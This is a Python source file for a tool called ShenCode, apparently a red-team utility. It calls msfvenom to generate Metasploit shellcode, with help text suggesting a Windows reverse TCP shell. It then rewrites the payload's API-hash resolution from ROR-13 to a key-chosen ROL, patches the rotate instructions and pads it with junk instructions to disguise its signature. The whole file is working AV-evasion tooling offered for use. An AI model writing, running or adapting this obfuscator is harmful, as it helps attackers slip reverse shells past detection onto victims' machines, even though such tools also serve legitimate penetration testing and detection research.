from datetime import datetime
from capstone import *
import argparse
import os
import subprocess
import pefile

hash_dict = dict()

class nstate:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m[*]\033[0m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m[+]\033[0m'
    WARNING = '\033[93m'
    FAIL = '\033[91m[-]\033[0m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def GenerateFileName():
  now = datetime.now()
  actDate = now.strftime("%d%m%y-%H%M%S")
  fileName = "sc-" + actDate + ".bin"
  return fileName
 
def lookup_functions(dll_path):
  pe = pefile.PE(dll_path)
  export_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']]
  for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    if exp.name:
      function_name = exp.name.decode()
      dll_name = os.path.basename(dll_path)
      hash = calculate_hash(dll_name, function_name, 13, "ror")
      hash_dict[hash] = dll_name + '!' + function_name
 
def ror(dword, bits):
    return ((dword >> (bits%32)) | (dword << (32-(bits%32)))) & 0xffffffff
 
def rol(dword, bits):
    return ((dword << (bits%32)) | (dword >> (32-(bits%32)))) & 0xffffffff
 
def unicode(string, uppercase=True):
    result = ''
    if uppercase:
        string = string.upper()
    for c in string:
        result += c + '\x00'
    return result
 
def calculate_hash(module, function, bits, hash_type):
    module_hash = 0
    function_hash = 0
    for c in unicode(module + '\x00'):
        if hash_type == "ror":
            module_hash = ror(module_hash, bits)
        if hash_type == "rol":
            module_hash = rol(module_hash, bits)
        module_hash += ord(c)
    for c in function + '\x00':
        if hash_type == "ror":
            function_hash = ror(function_hash, bits)
        if hash_type == "rol":
            function_hash = rol(function_hash, bits)
        function_hash += ord(c)
    hash = module_hash + function_hash & 0xFFFFFFFF
    return hash
 
def check_shellcode(shellcode, pattern):
    byte_data = pattern.to_bytes(4, 'big')
    reversed_bytes = byte_data[::-1]
    index = shellcode.find(reversed_bytes)
    return index
 
def replace_bytes_at_offset(data, offset, new_bytes):
    data = bytearray(data)
    end_offset = offset + len(new_bytes)
    data[offset:end_offset] = new_bytes
    return bytes(data)
 
def highlight_byte_changes(original_bytes, modified_bytes):
    highlighted = []
    for original, modified in zip(original_bytes, modified_bytes):
        if original == modified:
            highlighted.append(f"\\x{original:02X}")
        else:
            highlighted.append(f"\\x{original:02X} -> \\x{modified:02X}")
    return "".join(highlighted)
 
def find_ror_instructions(data, search_bytes):
    occurrences = []
    index = 0
    while True:
        try:
            index = data.index(search_bytes, index)
            occurrences.append(index)
            index += 1
        except ValueError:
            break
    return occurrences
 
def process_shellcode(shellcode,ror_key):
    new_shellcode = shellcode
 
    for key,value in hash_dict.items():
        index = check_shellcode(shellcode, key)
        if index != -1:
            print(f'{nstate.OKGREEN} 0x%08X = %s offset: %s' % (key, value, index))
            dll_name = value.split('!')[0]
            function_name = value.split('!')[1]
            hash = calculate_hash(dll_name, function_name, ror_key, "rol")
            print(f'{nstate.OKGREEN}New value: 0x%08X' % (hash))
            byte_data = hash.to_bytes(4, 'big')
            reversed_bytes = byte_data[::-1]
            new_shellcode = replace_bytes_at_offset(new_shellcode, index, reversed_bytes)
            hex_string = ''.join('\\x{:02X}'.format(byte) for byte in new_shellcode)
 
    print(f"{nstate.OKGREEN} Changing ROR key")
    
    # \xC1\xCF\x0D ror edi,D

    ror_instances = find_ror_instructions(new_shellcode,b"\xC1\xCF\x0D")
    for ror_offset in ror_instances:
        bytes_key = ror_key.to_bytes(1, 'big')
        # We're replacing the ROR with a ROL here. ROR = \xC1\xCF\x0D  ROL = \xC1\xC7\+byte_key
        new_shellcode = replace_bytes_at_offset(new_shellcode, ror_offset, b"\xC1\xC7" + bytes_key )
         
    return new_shellcode

def main():
  print(f"{nstate.HEADER}____ _  _ ____ _  _ ____ ____ ___  ____ {nstate.ENDC}")
  print(f"{nstate.HEADER}[__  |__| |___ |\\ | |    |  | |  \\ |___ {nstate.ENDC}")
  print(f"{nstate.HEADER}___] |  | |___ | \\| |___ |__| |__/ |___{nstate.ENDC}")
  print(f"{nstate.HEADER}Version 0.1 by psycore8{nstate.ENDC}")
  parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
  parser.add_argument("-p", "--payload",                        help="Payload to use e.g. windows/shell_reverse_tcp")
  parser.add_argument("-a1","--arg1",                           help="argument1 for payload e.g. LHOST=127.0.0.1")
  parser.add_argument("-a2","--arg2",                           help="argument2 for payload e.g. LPORT=4443")
  parser.add_argument("-k", "--key",                            help="ROR key for encoding")
  parser.add_argument("-d", "--decompile", action="store_true", help="decompile modified bytes")
  parser.add_argument("-s", "--showmod",   action="store_true", help="display modifications")
  parser.add_argument("-v", "--verbose",   action="store_true", help="displays c++/c# shellcode")
  
  args = parser.parse_args()
  ror_key = args.key
  decompile = args.decompile
  showmod = args.showmod
  payload = args.payload
  arg1 = args.arg1
  arg2 = args.arg2
  
  if (int(ror_key) < 32) or (int(ror_key) > 255):
    print(f"{nstate.FAIL} Key must be between 33 and 255")
    exit()
 
  #if file_path and my_key:
    #print(f"[+] Encoding shellcode {file_path} using ROR key: {my_key}")
  #else:
    #print("[+] Please provide both --shellcode and --key arguments.")
    #exit()
  
  fn = str(GenerateFileName())
  print(f"{nstate.OKGREEN} filename will be: "+fn)
  
  print(f"{nstate.OKBLUE} create payload")
  result = subprocess.run(["c:\\metasploit-framework\\bin\\msfvenom.bat", "-p", payload, arg1, arg2, "-e", "generic/none", "--format", "raw", "-o", fn])
  if args.verbose:
    print(result.stdout)

  path = "./"+fn
  cf = os.path.isfile(path)
  if cf == True:
    print(f"{nstate.OKGREEN} shellcode created")
  else:
    print(f"{nstate.FAIL} shellcode output not found, EXIT")
    exit()
  
   # Populate hash_dict global variable
  dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
                 'C:\\Windows\\System32\\ws2_32.dll', 
                 'C:\\Windows\\System32\\wininet.dll', 
                 'C:\\Windows\\System32\\dnsapi.dll',
                 'C:\\Windows\\System32\\mswsock.dll']
     
  for dll in dll_paths:
    lookup_functions(dll)
 
    # Read existing shellcode
  print(f"{nstate.OKGREEN} Reading shellcode")
  try: 
    with open(fn, "rb") as file:
      shellcode = file.read()
  except FileNotFoundError:
    print(f"{nstate.FAIL} File not found or cannot be opened.")
 
  new_shellcode = process_shellcode(shellcode,int(ror_key))
 
    # Add some NOP's
  position = 1
  bytes_to_insert = b"\xFF\xC0\xFF\xC8" * 5  # INC EAX, DEC EAX
  modified_shellcode = new_shellcode[:position] + bytes_to_insert + new_shellcode[position:]
  
  if args.showmod:
    print(f"{nstate.OKGREEN} Modifications")
    highlighted_changes = highlight_byte_changes(shellcode, modified_shellcode)
    print(highlighted_changes)
 
  print(f"{nstate.OKBLUE} Shellcode size: " + str(len(modified_shellcode)))
  if args.verbose:
    print(f"{nstate.OKGREEN} Final shellcode (C++)")
    hex_string = ''.join('\\x{:02X}'.format(byte) for byte in modified_shellcode)
    print(hex_string)
    print(f"{nstate.OKGREEN} Final shellcode (C#)")
    hex_string = ''.join('0x{:02X},'.format(byte) for byte in modified_shellcode)
    print(hex_string[:-1])
 
  outputfile = "output.bin"
  print(f"{nstate.OKBLUE} Writing bytes to file: " + outputfile)
  with open(outputfile, 'wb') as file:
    file.write(modified_shellcode)
  path = outputfile
  cf = os.path.isfile(path)
  if cf == True:
    print(f"{nstate.OKGREEN} encoded shellcode created")
  else:
    print(f"{nstate.FAIL} encoded Shellcode error, aborting script execution")
    exit()
 
  if args.decompile:
    print(f"{nstate.OKGREEN} ASM Code")
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for i in md.disasm(modified_shellcode, 0x1000):
      print("0x%x:\t%s\t%s\t%s" %(i.address, ' '.join('{:02x}'.format(x) for x in i.bytes), i.mnemonic, i.op_str))  
  

if __name__ == "__main__":
  main()
